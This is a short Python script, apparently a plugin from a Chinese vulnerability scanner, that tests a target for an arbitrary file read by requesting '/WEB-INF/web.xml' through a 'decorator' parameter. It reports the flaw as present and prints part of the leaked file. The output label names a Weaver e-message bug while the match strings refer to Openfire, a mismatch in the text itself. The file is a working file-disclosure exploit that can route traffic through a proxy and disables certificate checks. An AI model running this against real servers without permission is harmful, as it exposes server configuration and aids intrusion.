import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        aa1 = requests.get(url1+'?decorator=%2FWEB-INF%2Fweb.xml&confirm=true',proxies=proxies,verify=False,timeout=15,cookies=s_cookie)
        if aa1.status_code==200 and 'Openfire' in aa1.text and '<cookie-config>' in aa1.text:
            cdd='[+]漏洞存在\n'+ str(aa1.text)[0:600]
        else:
            cdd='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 emessage任意文件读取 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)